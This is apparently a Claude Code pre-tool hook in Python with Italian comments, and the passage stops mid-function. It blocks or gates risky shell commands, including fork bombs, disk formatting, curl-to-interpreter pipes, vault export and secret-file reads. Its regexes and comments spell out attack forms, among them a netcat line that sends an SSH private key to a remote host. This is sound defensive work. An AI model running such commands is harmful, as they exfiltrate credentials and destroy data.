#!/usr/bin/env python3
"""PreToolUse(Bash) hook: blocca o gate shell command pericolosi.

I deny in settings.json coprono i casi a stringa esatta (`rm -rf /`, force-push).
Questo hook copre cio' che il match di stringa non gestisce:

BLOCCO DURO (exit 2, stderr -> modello):
- fork bomb, raw write su disco (`> /dev/...`, `dd of=/dev/...`, `mkfs.*`)
- chmod/chown ricorsivo su root
- esecuzione di script remoto scaricato al volo: `curl ... | bash`, ma anche
  `bash <(curl ...)`, `eval "$(curl ...)"`, `curl ... | python`. Dal 15/9/2026
  `curl ... | python3 -c "<codice>"` blocca solo se il codice inline esegue testo
  (exec, eval, subprocess, getattr, `$(`): altrimenti è parsing dello stdin
- `bw export` (dump dell'intera vault Bitwarden in chiaro)

CHIEDE CONFERMA (permissionDecision:"ask", exit 0):
- `rm -r`, `find -delete`, `shutil.rmtree` su una cartella che non si rigenera da
  sola e non è temporanea (~/.claude, memoria, progetti, cwd, cartelle di lavoro)
- `git clean -f` (i file non tracciati non stanno in nessun commit)
- scrittura shell su ~/.claude/settings*, hooks/**, firme/** o sugli script dell'aggiornamento
  automatico (auto-modifica delle guardie, codice non firmato installato da solo),
  incluso il caso `cd ~/.claude/hooks && > file` (target relativo dopo un cd)
- scrittura shell su git hook (.git/hooks/**) e servizi di avvio automatico
  (~/Library/LaunchAgents, ~/.config/systemd/user, ~/.config/autostart)
- creazione di un file di unlock (*-unlock-*) che sbloccherebbe l'auto-modifica
- lettura di file segreti via shell (cat/head/xxd/base64/perl/ruby/nc/redirezione
  `< file`... su chiavi private, ~/.ssh, ~/.aws/credentials, .gnupg, *.pem, .env...),
  anche indiretta: `find <segreto> | xargs cat`, `find -exec cat`, `while read`
- docker distruttivo su volumi (`docker volume rm`, `system prune --volumes`)

Fail-open su parsing (i casi catastrofici su path root restano nei deny).
"""
import json
import re
import sys
import os
import signal
import shlex
import importlib.util


def _stdin_timeout(signum, frame):
    sys.exit(0)


if hasattr(signal, "SIGALRM"):
    signal.signal(signal.SIGALRM, _stdin_timeout)


# --- Blocco duro (exit 2) ---
DANGEROUS = [
    (r":\(\)\s*\{[^}]*\}\s*;\s*:", "fork bomb"),
    (r"\bmkfs\.[a-z0-9]+", "format filesystem"),
    (r"\bdd\s+[^|]*\bof=/dev/(sd[a-z]|nvme|disk)", "scrittura raw su block device"),
    (r">\s*/dev/(sd[a-z]|nvme|disk|hd[a-z])", "redirezione raw su disco"),
    (r"\bchmod\s+-R\s+0*777\s+/(\s|$)", "permessi world-writable su root"),
    (r"\bchown\s+-R\s+\S+\s+/(\s|$)", "cambio ownership ricorsivo su root"),
    # curl|bash e le sue varianti che eseguono uno script remoto scaricato al volo:
    (r"\b(curl|wget|fetch)\b[^|]*\|\s*(sudo\s+)?(bash|sh|zsh|fish|perl|ruby|node|php)\b",
     "pipe di script remoto in un interprete"),
    # 15/9/2026: `curl ... | python3 -c "import json..."` è parsing, non esecuzione
    # dello stdin (14 blocchi in una settimana). Passa solo il codice inline fra
    # virgolette senza command-substitution né primitive che eseguono testo. Le
    # coppie di escape (`\\n`, `\\"`) si consumano intere: la ricerca delle parole
    # vietate continua fino alla virgoletta che chiude davvero.
    # 15/10/2026: anche con i flag dell'interprete prima di -c (`python3 -I -c`, la
    # forma isolata) e con la versione (`python3.13`).
    (r"\b(curl|wget|fetch)\b[^|]*\|\s*(sudo\s+)?python3?(?:\.\d+)?(?![\w.])"
     r"(?!(?:\s+-[IEsSBuOqP]+)*\s+-c\s+([\"'])(?:\\[\s\S]|(?!\3|\\|\$\(|`|\b(?:exec|eval|compile|__import__|__builtins__|builtins|"
     r"getattr|globals|importlib|system|popen|subprocess|runpy|pickle|marshal|spawn)\b)[\s\S])*\3)",
     "pipe di script remoto in un interprete"),
    (r"\b(bash|sh|zsh|fish|python3?|perl|ruby|node|php)\b\s+<\(\s*(curl|wget|fetch)\b",
     "esecuzione via process-substitution di script remoto"),
    (r"\beval\b[^\n]*\$\(\s*(curl|wget|fetch)\b",
     "eval di output di download remoto"),
    (r"\b(bash|sh|zsh|fish|python3?|perl|ruby|node)\b\s+-c\s+[\"']?\$\(\s*(curl|wget|fetch)\b",
     "interprete -c su output di download remoto"),
    (r"\bsudo\s+rm\s+-rf?\s+(/|~|\$HOME|\*)", "rm ricorsivo con sudo su root/home/wildcard"),
    # `bw export` anche con opzioni e valori davanti (`bw --session X export`):
    # il deny di settings.json copre solo la forma letterale. `--help` non esporta
    # niente: resta libero (tre falsi positivi il 12/9/2026).
    (r"\bbw\b(\s+-[-\w]+(\s+[^\s-][^\s]*)?)*\s+export\b(?!\s+(--help|-h)\b)",
     "export dell'intera vault Bitwarden in chiaro"),
]

# --- Scrittura su config/hook di Claude Code -> ask ---
# Path config/hook considerati sensibili (settings*.json, hooks/**, .claude.json).
_CFG_SUFFIX_RE = re.compile(
    r"\.claude/(?:settings[^/]*\.json|hooks/|hooks$|\.claude\.json)",
    re.IGNORECASE,
)
# Operatori di scrittura shell. Il match testuale del path assoluto è il caso base;
# _writes_config() sotto copre anche il target RELATIVO dopo un `cd ~/.claude/...`.
_CFG_ABS = r"[^\s'\";|&]*\.claude/(?:settings[^/\s'\"]*\.json|hooks/|\.claude\.json)"
# cp, mv, install, rsync e ln non stanno qui: li giudica _writes_config, che sa quale
# argomento è la destinazione. Nel testo `cp ~/.claude/settings.json /tmp/x` sembrava una
# scrittura, e copiare la config altrove è una lettura (9/9/2026, nella config dell'autore).
# dd scrive solo su `of=`.
CONFIG_WRITE_RE = re.compile(
    r"(?:>>?\s*" + _CFG_ABS +
    r"|\b(?:tee|truncate|touch|chmod|chown)\b[^|;&]*" + _CFG_ABS +
    r"|\bdd\b[^|;&]*\bof=" + _CFG_ABS +
    r"|\bsed\b[^|;&]*-i[^|;&]*" + _CFG_ABS +
    r"|open\(\s*['\"][^'\"]*\.claude/(?:settings|hooks/|\.claude\.json)[^'\"]*['\"]\s*,\s*['\"][wa])",
    re.IGNORECASE,
)
# CLAUDE.md, in qualunque cartella: via Edit/Write lo protegge protect_claude_md.py con un
# unlock, qui si copre il vettore shell (>, sed -i, cp, tee...), che altrimenti lo riscrive senza prompt.
CLAUDE_MD_WRITE_RE = re.compile(
    r"(?:>>?\s*[^\s'\";|&]*CLAUDE(?:\.local)?\.md\b"
    r"|\bsed\b[^|;&]*-i[^|;&]*CLAUDE(?:\.local)?\.md\b"
    r"|open\(\s*['\"][^'\"]*CLAUDE(?:\.local)?\.md['\"]\s*,\s*['\"][wa])"
)
# Percorsi di avvio automatico (git hook, LaunchAgents, systemd utente, autostart):
# via Edit/Write li protegge protect_claude_md.py con un unlock, qui il vettore shell.
_PERSIST_ABS = (r"[^\s'\";|&]*(?:\.git/hooks/[^\s'\";|&]+|Library/LaunchAgents/[^\s'\";|&]+"
                r"|\.config/(?:systemd/user|autostart)/[^\s'\";|&]+)")
# Qui solo redirezione e open(): cp, tee, sed -i e gli altri binari li giudica
# _writes_config, che sa quale argomento è la destinazione (copiare un hook
# altrove è una lettura).
PERSIST_WRITE_RE = re.compile(
    r"(?:>>?\s*" + _PERSIST_ABS +
    r"|open\(\s*['\"][^'\"]*(?:\.git/hooks/|Library/LaunchAgents/|\.config/(?:systemd/user|autostart)/)[^'\"]*['\"]\s*,\s*['\"][wa])"
)
# Binari che scrivono un file passato come argomento.
_WRITE_BINS = frozenset("tee cp mv install rsync ln dd truncate touch".split())

# --- File di unlock che sbloccherebbero l'auto-modifica di config/hook -> ask ---
# Solo la CREAZIONE del file (redirezione, touch, tee, open in scrittura) e solo direttamente
# in ~/.claude, dove protect_claude_md.py lo cerca. Leggere una nota che ha "unlock" nel nome
# non sblocca niente (8/9/2026, nella config dell'autore). cp, mv e ln: _writes_config(_is_unlock).
_UNLOCK_ABS = r"[^\s'\";|&]*\.claude/[^\s'\";|&/]*unlock[^\s'\";|&/]*(?=[\s'\";|&)]|$)"
UNLOCK_RE = re.compile(
    r"(?:>>?\s*|\b(?:touch|tee)\b[^|;&]*)" + _UNLOCK_ABS +
    r"|open\(\s*['\"][^'\"]*\.claude/[^'\"/]*unlock[^'\"/]*['\"]\s*,\s*['\"][wax]",
    re.IGNORECASE,
)

# --- Lettura di file segreti via shell -> ask (vedi _reads_secret sotto) ---
# In ~/.ssh/ chiedono le chiavi private e i file sconosciuti. config, known_hosts,
# authorized_keys e le chiavi pubbliche (.pub) non sono segreti: si leggono liberi
# (8/9/2026, la config dell'autore chiedeva a ogni `grep Host ~/.ssh/config`).
_SSH_SEGRETO = (r"\.ssh/(?!(?:config|known_hosts(?:\.old)?|authorized_keys)(?![\w.-])|[^\s'\"/]*\.pub(?![\w.-]))"
                r"|(?:^|/)id_(?:rsa|ed25519|ecdsa|dsa)\b(?!\.pub\b)")
SECRET_PATH_RE = re.compile(
    r"(" + _SSH_SEGRETO + r"|\.aws/credentials|\.gnupg/|"
    # I file col solo nome (token_cache.json...) contano come argomento o in un path, non
    # citati dopo uno spazio: `python3 -c "...write('serve rm token_cache.json')"` scrive una
    # nota, non legge il token (8/9/2026, nella config dell'autore).
    r"\.git-credentials|\.pem\b|"
    r"(?<!\s)(?:service-account[^\s'\"]*\.json|credentials\.json|client_secret[^\s'\"]*\.json|token_cache\.json)|"
    r"\.pypirc|secrets\.env|\.secrets/|"
    r"\.config/gh/hosts\.yml|\.npmrc|\.claude/data/credentials/|"
    r"\.docker/config\.json|\.kube/config|"
    # ~/.claude.json tiene le env dei server MCP, chiavi API comprese. Solo in forma di
    # PATH (`/` o `~` davanti): il nome citato in una frase non è una lettura.
    r"[/~][^\s'\"]*/\.claude\.json)",
    re.IGNORECASE,
)
# Un file .env (anche .env.local, config/.env.production): le chiavi dei servizi di un progetto
# (17/10/2026, #3506). Non .env.example e simili, non process.env. Come destinazione di una copia
# (`cp .env.example .env`) si scrive, non si legge: vedi _reads_secret_flat.
ENV_RE = re.compile(r"(?<![\w.])\.env\b(?!\.(?:example|sample|template|dist)\b)", re.IGNORECASE)

# Check segreti PER-SEGMENTO. Chiede se un path segreto compare come ARGOMENTO
# (non come identità ssh) in un segmento il cui comando è un binario di lettura
# o di trasporto, oppure se il segmento reindirizza un segreto in ingresso
# (`< chiave`, `$(< chiave)`). Ampliato per coprire perl/ruby/nc/socat/tac/rev/
# mapfile e la redirezione, che prima sfuggivano (chiave privata leggibile/inviata
# senza ask). Lo scarto di `-i <key>` / `IdentityFile=` evita i falsi positivi su
# ssh/scp -i <chiave> (identità, non lettura).
_READ_BINS = frozenset(
    "cat head tail less more bat xxd od strings base64 nl cut awk sed "
    "cp scp rsync dd open grep perl ruby python python3 tac rev mapfile "
    "nc ncat socat gpg tar zip curl wget".split()
)
_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
_SKIP_WRAPPERS = frozenset(("sudo", "command", "nohup", "caffeinate", "timeout", "env"))
# `< file` o `$(< file)` con file segreto: esfiltrazione via redirezione (es.
# `nc host 443 < ~/.ssh/id_ed25519`, `echo "$(<~/.ssh/id_ed25519)"`).
_SECRET_REDIR_RE = re.compile(
    r"(?:<\s*|\$\(\s*<\s*)[^\s'\";|&)]*"
    r"(\.ssh/(?!(?:config|known_hosts(?:\.old)?|authorized_keys)(?![\w.-])|[^\s'\"/]*\.pub(?![\w.-]))|"
    r"id_(rsa|ed25519|ecdsa|dsa)\b(?!\.pub\b)|\.aws/credentials|\.gnupg/|"
    r"\.git-credentials|\.pem|credentials\.json|\.pypirc|secrets\.env|\.secrets/|"
    r"token_cache\.json|client_secret|\.claude/data/credentials/|"
    r"(?<![\w.])\.env\b(?!\.(?:example|sample|template|dist)\b))",
    re.IGNORECASE,
)


def _cmd_subst_bodies(command: str):
    """Corpi delle command-substitution `$(...)` e backtick: bash li ESEGUE anche
    dentro le doppie virgolette, quindi `git commit -m "$(cat chiave)"` legge davvero
    la chiave. Vanno analizzati come comandi a se'."""
    bodies = re.findall(r"\$\(([^()]*)\)", command)
    bodies += re.findall(r"`([^`]*)`", command)
    return bodies


def _reads_secret(command: str) -> bool:
    cmd = _testo_shell(command).replace("\\\n", " ")  # prima gli heredoc: una \ nel corpo è testo
    for src in [cmd] + _cmd_subst_bodies(cmd):
        if _reads_secret_flat(src):
            return True
    return False


# Il tokenizer (heredoc, messaggi di commit, segmenti) sta in forma_comando.py dal 15/10/2026:
# prima forma_comando caricava questo file e questo file caricava forma_comando.
_spec_fc = importlib.util.spec_from_file_location(
    "forma_comando", os.path.join(os.path.dirname(os.path.abspath(__file__)), "forma_comando.py"))
_fc = importlib.util.module_from_spec(_spec_fc)
_spec_fc.loader.exec_module(_fc)
_testo_shell = _fc.testo_shell
_segmenti_parole = _fc.segmenti_parole
_hd = _fc._hd


# grep che stampa solo conteggi o nomi di file: nessun contenuto esce.
_GREP_SOLO_METADATI = re.compile(r"^-[A-Za-z]*[clLq][A-Za-z]*$|^--(count|files-with(out)?-matches?|quiet|silent)$")
_GREP_OPT_CON_ARG = frozenset(("-A", "-B", "-C", "-m", "-d", "-D", "--context", "--max-count"))


def _senza_pattern(binario: str, args: list) -> list:
    """Toglie il pattern di grep o lo script di sed: è testo, non un file letto.

    `grep -e P` e `sed -e S` hanno il pattern esplicito, e allora nessun
    argomento posizionale è pattern. `grep -f F` e `sed -f F` LEGGONO F: resta.
    """
    if binario not in ("grep", "egrep", "fgrep", "rg", "sed"):
        return args
    esplicito = ("-e", "--regexp", "--expression")
    fuori, i, tolto = [], 0, False
    if any(a in esplicito or a in ("-f", "--file") or a.startswith(("--regexp=", "--expression=", "--file=")) for a in args):
        tolto = True
    while i < len(args):
        a = args[i]
        if a in esplicito:
            i += 2
            continue
        if binario == "sed" and a == "-i" and i + 1 < len(args) and (args[i + 1] == "" or args[i + 1].startswith(".")):
            fuori.extend(args[i:i + 2])
            i += 2
            continue
        if a in ("-f", "--file") or (a in _GREP_OPT_CON_ARG and binario != "sed"):
            fuori.extend(args[i:i + 2])
            i += 2
            continue
        if not tolto and not a.startswith("-"):
            tolto = True
            i += 1
            continue
        fuori.append(a)
        i += 1
    return fuori


_SHELLS = _fc.SHELL
# La cartella nominata senza slash finale (`find ~/.aws | xargs cat`): SECRET_PATH_RE
# vuole lo slash, perché per un cat diretto il nome della cartella non è una lettura.
# Per xargs e -exec invece la cartella è la sorgente dei file letti.
_SECRET_DIR_RE = re.compile(r"(\.ssh|\.gnupg|\.secrets|\.aws|\.claude/data/credentials)(?=[\s'\"/*]|$)")


def _lettura_indiretta(cmd):
    """Il path segreto e il lettore stanno in comandi diversi, e il controllo per
    segmento non li vede insieme: `find <segreto> | xargs cat`,
    `echo <segreto> | while read f; do cat "$f"`, `find <segreto> -exec cat {} \\;`.
    `ls <segreto> | xargs basename` resta muto."""
    def segreto(s):
        return SECRET_PATH_RE.search(s) or _SECRET_DIR_RE.search(s)

    testo = re.sub(r"\d*>&\d+|&>", " ", cmd)
    for stmt in re.split(r"\|\||&&|[;&\n]", testo):
        stadi = stmt.split("|")
        for k, stadio in enumerate(stadi):
            if not segreto(stadio):
                continue
            for dopo in stadi[k + 1:]:
                toks = [os.path.basename(t) for t in dopo.split()]
                if not toks:
                    continue
                if toks[0] in ("xargs", "parallel") and any(t in _READ_BINS or t in _SHELLS for t in toks[1:]):
                    return True
                if toks[0] == "while" and "read" in toks[1:3]:
                    return True
        m = re.search(r"\bfind\b(.*?)\s-(?:exec|execdir|ok|okdir)\s+(\S+)", stmt)
        if m and segreto(m.group(1)) and os.path.basename(m.group(2)) in (_READ_BINS | _SHELLS):
            return True
    return False


def _reads_secret_flat(cmd: str) -> bool:
    if _SECRET_REDIR_RE.search(cmd):
        return True
    if _lettura_indiretta(cmd):
        return True
    for toks in _segmenti_parole(cmd):
        i = 0
        while i < len(toks) and (
            _ENV_ASSIGN_RE.match(toks[i]) or toks[i] in _SKIP_WRAPPERS
        ):
            i += 1
        if i >= len(toks):
            continue
        binario = os.path.basename(toks[i])
        if binario not in _READ_BINS:
            continue
        # grep -c, -l, -q: stampa conteggi o nomi di file, non il contenuto.
        if binario in ("grep", "egrep", "fgrep") and any(_GREP_SOLO_METADATI.match(t) for t in toks[i + 1:]):
            continue
        parole = _senza_pattern(binario, toks[i + 1:])
        grep = binario in ("grep", "egrep", "fgrep")
        args, j = [], 0
        while j < len(parole):
            t = parole[j]
            if t == "-i" and grep:
                j += 1  # per grep -i è "ignora maiuscole", senza argomento
                continue
            if t == "-i" and j + 1 < len(parole):
                j += 2  # identità ssh/scp/rsync (o suffix sed -i: mai un segreto)
                continue
            if t.startswith("-oIdentityFile=") or t.startswith("IdentityFile="):
                j += 1
                continue
            # rsync e tar: il valore di --exclude è un file che NON si legge (`--exclude .env` chiedeva
            # conferma, 20/10/2026, #3525).
            if t in ("--exclude", "--exclude-from", "--filter") and j + 1 < len(parole):
                j += 2
                continue
            if t.startswith(("--exclude=", "--exclude-from=", "--filter=")):
                j += 1
                continue
            args.append(t)
            j += 1
        if any(SECRET_PATH_RE.search(a) for a in args):
            return True
        letti = args[:-1] if binario in ("cp", "install", "rsync", "scp") and len(args) >= 2 else args
        if any(ENV_RE.search(a) for a in letti):
            return True
    return False

# --- Docker distruttivo su volumi -> ask ---
DOCKER_DESTRUCTIVE_RE = re.compile(
    r"\bdocker\s+volume\s+rm\b|\bdocker\s+system\s+prune\b[^|]*--volumes",
    re.IGNORECASE,
)

BARE_TARGETS = {".", "./", "*", ".*", "*.*", "./*", ".//"}

# --- sed che SCRIVE col comando `w` -> ask ---
# Il comando `w` di sed scrive su file anche sotto `-n`, e anche come flag di `s///`:
# `sed -n 'w ~/.zshrc' x` sovrascrive .zshrc aggirando il deny Edit(~/.zshrc).
# Il carattere prima di `w` è "non alfanumerico" per coprire l'apice di 'w file',
# lo spazio di `; w file` e lo slash di `s/a/b/w file`. `[^|&]*` non attraversa una
# pipe, così `sed -n p x | grep w foo` non matcha.
SED_WRITE_RE = re.compile(r"(^|[\s;&|])sed\s[^|&]*[^A-Za-z0-9]w\s+[^\s|;&]")
_SED_SCRIPT_W = re.compile(r"(^|[^A-Za-z0-9])w\s+[^\s|;&]")


def _sed_scrive(command: str) -> bool:
    """`sed` che scrive col comando `w`, cercato nel solo segmento di sed (15/10/2026).

    La regex sull'intero comando attraversava `;` e a capo:
    `sed -n 25,50p f; for w in a b` sembrava una scrittura. Dentro una shell
    annidata o un ssh il segmento resta intero e vale la regex di prima.
    """
    for toks in _segmenti_parole(_testo_shell(command)):
        i = 0
        while i < len(toks) and (_ENV_ASSIGN_RE.match(toks[i]) or toks[i] in _SKIP_WRAPPERS):
            i += 1
        if i >= len(toks):
            continue
        binario = os.path.basename(toks[i])
        if binario == "sed" and _SED_SCRIPT_W.search(" ".join(toks[i + 1:])):
            return True
        if binario in _SHELLS | {"ssh", "eval", "xargs"} and SED_WRITE_RE.search(" ".join(toks)):
            return True
    return False

# Cartelle che uno strumento ricrea da solo: cancellarle non perde lavoro.
RIGENERABILI = {
    "node_modules", "dist", "build", "out", ".next", ".nuxt", ".svelte-kit",
    ".turbo", ".parcel-cache", ".cache", "coverage", "__pycache__",
    ".pytest_cache", ".mypy_cache", ".ruff_cache", ".venv", "venv", "target",
}

def _home():
    return os.path.expanduser("~")


def _projects_base():
    raw = os.environ.get("PROJECTS_BASE", "").strip()
    if raw:
        raw = raw.replace("${HOME}", _home()).replace("$HOME", _home())
        return os.path.normpath(os.path.expanduser(raw))
    return os.path.normpath(os.path.join(_home(), "Documents", "ClaudeCode"))


def _ask(reason):
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "ask",
            "permissionDecisionReason": reason,
        }
    }))
    return 0


# Variabili shell nel target: `${VAR:-default}`, `${VAR}`, `$VAR`.
_VAR_RE = re.compile(r"\$\{([A-Za-z_][A-Za-z0-9_]*)(:?[-=])([^}]*)\}|\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)")
# Assegnazioni nel comando: `X=...`, `export X=... Y=...`. Il valore vale per il
# comando: `export D=$TMPDIR/prova; rm -rf $D` cancella una cartella temporanea.
_ASSEGNAZIONE_CMD_RE = re.compile(r"""(?:^|(?<=[\s;&|(]))([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|[^\s;&|()]*)""")
_ASSEGNAZIONE_MKTEMP_RE = re.compile(r"""(?:^|(?<=[\s;&|(]))([A-Za-z_][A-Za-z0-9_]*)=(?:"(\$\(\s*mktemp\b[^()`$;|&"]*\))"|(\$\(\s*mktemp\b[^()`$;|&"]*\)))""")
_ASSEGNATE = {}


def _assegnazioni(command):
    """Le variabili assegnate nel comando, in ordine (vince l'ultima), col valore grezzo."""
    trovate = []
    for m in _ASSEGNAZIONE_CMD_RE.finditer(command):
        grezzo = m.group(3) if m.group(3) is not None else (m.group(4) if m.group(4) is not None else m.group(2))
        trovate.append((m.start(), m.group(1), grezzo))
    # `tmp=$(mktemp -d)`: la regex sopra si ferma alla parentesi e lascia "$" (20/10/2026)
    for m in _ASSEGNAZIONE_MKTEMP_RE.finditer(command):
        trovate.append((m.start(), m.group(1), m.group(2) or m.group(3)))
    out = {}
    for _, nome, valore in sorted(trovate, key=lambda x: x[0]):
        out[nome] = valore
    return out


def _expand_vars(t):
    """Espande le variabili: prima quelle assegnate nel comando, poi l'ambiente
    dell'hook (quello della sessione: TMPDIR, HOME...). Restituisce None se resta
    qualcosa che non si risolve (`$(...)`, backtick, variabile non definita): un
    path che non si conosce non si giudica come sicuro."""
    def rep(m):
        name = m.group(1) or m.group(4) or m.group(5)
        if name in _ASSEGNATE and _MKTEMP_RE.match(_ASSEGNATE[name]):
            val = "/tmp/mktemp.XXXXXX"  # cartella appena creata da mktemp: vedi _MKTEMP_RE
        elif name in _ASSEGNATE:
            val = os.path.expanduser(_ASSEGNATE[name]) if _ASSEGNATE[name].startswith("~") else _ASSEGNATE[name]
        else:
            val = _home() if name == "HOME" else os.environ.get(name)
        if m.group(1):
            if val is None or (val == "" and m.group(2).startswith(":")):
                return m.group(3)
            return val
        return val if val is not None else m.group(0)
    for _ in range(3):  # il default può contenere a sua volta una variabile (${X:-$HOME/..})
        t2 = _VAR_RE.sub(rep, t)
        if t2 == t:
            break
        t = t2
    if "$" in t or "`" in t:
        return None
    return t


# `$(mktemp ...)` crea una cartella o un file nuovo e vuoto: cancellarlo non perde niente
# (7/9/2026, nella config dell'autore). Vale come un temporaneo.
_MKTEMP_RE = re.compile(r"^\$\(\s*mktemp\b[^()`$;|&]*\)$")


def _resolve(target, cwd):
    t = (target or "").strip().strip('"').strip("'")
    if not t:
        return None
    if _MKTEMP_RE.match(t):
        return os.path.normpath("/tmp/mktemp.XXXXXX")
    t = _expand_vars(t)
    if t is None:
        return None
    t = os.path.expanduser(t)
    if not os.path.isabs(t):
        if cwd is None:
            return None  # cwd sconosciuto (cd verso un path che non si risolve): niente path inventati
        t = os.path.join(cwd, t)
    return os.path.normpath(t)


def _log_di_job(p):
    """True per la cartella di un job di bin/bgjob.sh (~/.claude/data/logs/bgjobs/<job>):
    log rigenerabili e ignorati da git (3/10/2026). La cartella bgjobs stessa no."""
    bgjobs = os.path.normpath(os.path.join(_home(), ".claude", "data", "logs", "bgjobs"))
    return bool(p) and p.startswith(bgjobs + os.sep)


def _is_protected_tree(p):
    if not p:
        return False
    h = _home()
    claude = os.path.normpath(os.path.join(h, ".claude"))
    base = _projects_base()
    if _log_di_job(p):
        return False
    if p == claude or p.startswith(claude + os.sep):
        return True
    if p == base:
        return True
    if os.path.dirname(p) == base:
        return True
    if p == h or p == os.path.normpath("/"):
        return True
    return False


def _under_claude_config(p):
    """True se il path reale cade su ~/.claude/settings*, ~/.claude/hooks/** o .claude.json, oppure
    sull'aggiornamento automatico: la chiave dei rilasci (firme/**) e i due script che la verificano e
    installano. Chi li cambia fa installare da solo codice non firmato (16/10/2026, #3482). Solo qui,
    sul percorso risolto: la regex testuale li vedrebbe anche come sorgente di un cp (/inizio, /aggiorna)."""
    if not p:
        return False
    h = _home()
    radice = os.path.normpath(os.path.join(h, ".claude"))
    for cartella in ("hooks", "firme"):
        tutta = os.path.join(radice, cartella)
        if p == tutta or p.startswith(tutta + os.sep):
            return True
    if p in (os.path.join(radice, "bin", "aggiornamenti.py"), os.path.join(radice, "bin", "aggiorna-applica.sh")):
        return True
    base = os.path.basename(p)
    if os.path.dirname(p) == os.path.normpath(os.path.join(h, ".claude")):
        if base == ".claude.json" or (base.startswith("settings") and base.endswith(".json")):
            return True
    return False


def _is_persistenza(p):
    """True se il path reale è un git hook o un file di avvio automatico."""
    if not p:
        return False
    if (os.sep + ".git" + os.sep + "hooks" + os.sep) in p or p.endswith(os.sep + ".git" + os.sep + "hooks"):
        return True
    h = _home()
    for radice in ("Library/LaunchAgents", ".config/systemd/user", ".config/autostart"):
        r = os.path.normpath(os.path.join(h, radice))
        if p == r or p.startswith(r + os.sep):
            return True
    return False


def _is_claude_md(p):
    return bool(p) and os.path.basename(p) in ("CLAUDE.md", "CLAUDE.local.md")


def _is_unlock(p):
    """True per un file di unlock: "unlock" nel nome, direttamente in ~/.claude."""
    return (bool(p) and "unlock" in os.path.basename(p).lower()
            and os.path.dirname(p) == os.path.normpath(os.path.join(_home(), ".claude")))


def _writes_config(command, cwd, protetto=None):
    """Copre `cd ~/.claude/hooks && > file` (target relativo dopo un cd): il match
    testuale di CONFIG_WRITE_RE vede solo i path assoluti che contengono `.claude/`.
    Qui si traccia il cd per segmento e si risolve il target reale del redirect/binario.
    `protetto` sceglie cosa si cerca: di default config e hook, oppure _is_claude_md."""
    protetto = protetto or _under_claude_config
    cwd_decl = None
    for seg in re.split(r"&&|\|\||;|\||\n", command):
        seg = seg.strip()
        if not seg:
            continue
        try:
            toks = shlex.split(seg)
        except Exception:
            toks = seg.split()
        if not toks:
            continue
        if toks[0] == "cd" and len(toks) >= 2:
            cwd_decl = _resolve(toks[1], cwd_decl or cwd)
            continue
        base_cwd = cwd_decl or cwd
        # `git log --output=...` scrive quanto una redirezione: non può saltare
        # il controllo soltanto perché il binario si chiama git.
        for index, token in enumerate(toks):
            output = None
            if token.startswith("--output="):
                output = token.partition("=")[2]
            elif token == "--output" and index + 1 < len(toks):
                output = toks[index + 1]
            if output and protetto(_resolve(output, base_cwd)):
                return True
        # redirect > / >> verso un target
        m = re.search(r">>?\s*([^\s'\";|&]+)", seg)
        if m and protetto(_resolve(m.group(1), base_cwd)):
            return True
        # binario di scrittura con un target come argomento
        cmd0 = os.path.basename(toks[0])
        if cmd0 in _WRITE_BINS:
            argomenti = [t for t in toks[1:] if not t.startswith("-")]
            # cp, install, rsync e ln scrivono solo l'ultimo argomento (la sorgente si legge),
            # salvo -t/--target-directory, che sposta la destinazione: allora contano tutti.
            if cmd0 in ("cp", "install", "rsync", "ln") and argomenti and not any(
                    t == "-t" or t.startswith("--target-directory") for t in toks[1:]):
                argomenti = argomenti[-1:]
            for t in argomenti:
                if protetto(_resolve(t, base_cwd)):
                    return True
        # sed -i sul file
        if cmd0 == "sed" and "-i" in seg:
            for t in toks[1:]:
                if not t.startswith("-") and protetto(_resolve(t, base_cwd)):
                    return True
    return False


def _temporaneo(p):
    """True per i path di file temporanei del sistema: /tmp, /private/tmp, /var/folders, $TMPDIR,
    e su Windows %TEMP%, che sta dentro la home. Stessa regola di volatile() in
    bin/inventario-sessione.py: una HOME dentro una cartella temporanea (i banchi) non lo è."""
    # Su Windows normpath scrive `\tmp\prova` e Git Bash `/c/Users`: il confronto si fa con le
    # barre dritte, la lettera del disco e, su Windows, senza maiuscole.
    def dritto(q):
        q = q.replace("\\", "/").rstrip("/")
        if os.name == "nt":
            q = re.sub(r"^/([a-zA-Z])(?=/|$)", r"\1:", q).lower()
        return q

    def sotto(a, b):
        return a == b or a.startswith(b + "/")
    p = dritto(p)
    h = dritto(_home())
    if sotto(h, p):
        return False  # la home, o una cartella che la contiene, non è mai temporanea
    radici = ["/tmp", "/private/tmp", "/var/folders", "/private/var/folders"]
    for nome in ("TMPDIR", "TEMP", "TMP"):
        if os.environ.get(nome, "").strip():
            radici.append(dritto(os.path.normpath(os.environ[nome])))
    for r in radici:
        if r and sotto(p, r):
            if sotto(h, r) and sotto(p, h):
                continue  # i file di una HOME che sta in una cartella temporanea: i banchi
            return True
    return False


def _rigenerabile(p):
    """True se il path è una cartella che si ricrea da sola, o sta dentro una di esse."""
    if _log_di_job(p):
        return True
    parti = p.replace("\\", "/").split("/")
    return any(parte in RIGENERABILI for parte in parti)


def _forma():
    """forma_comando.py della stessa cartella, già caricato in testa al file."""
    return _fc


def _find_delete(command):
    """`find … -delete` e `find … -exec rm` cancellano quanto un rm ricorsivo."""
    for nome, args in _forma().programmi(command):
        if nome != "find":
            continue
        if "-delete" in args:
            return True
        for i, t in enumerate(args[:-1]):
            if t in ("-exec", "-execdir", "-ok", "-okdir") and os.path.basename(args[i + 1]) == "rm":
                return True
    return False


# shutil.rmtree cancella una cartella intera come `rm -r`, ma da dentro python (17/10/2026, #3506).
_RMTREE_RE = re.compile(r"\b(?:shutil\.)?rmtree\s*\(\s*(?:(['\"])([^'\"]*)\1|([A-Za-z_]\w*)\s*\))?")
# `py` è il lanciatore di python su Windows (20/10/2026, #3525: `py -c "...rmtree..."` passava).
_PYTHON_RE = re.compile(r"(?:^|[\s;&|(/])(?:python3?(?:\.\d+)?|py)(?=\s|$)")
_RMTREE_ALIAS_RE = re.compile(r"\brmtree\s+as\s+([A-Za-z_]\w*)")
_TEMPORANEA = "<cartella di tempfile>"


def _rmtree_bersagli(command):
    """I bersagli di shutil.rmtree nel codice python del comando: il percorso scritto, o None se il
    percorso arriva da una variabile. Il corpo di un heredoc che va a un lettore (cat, tee) non conta."""
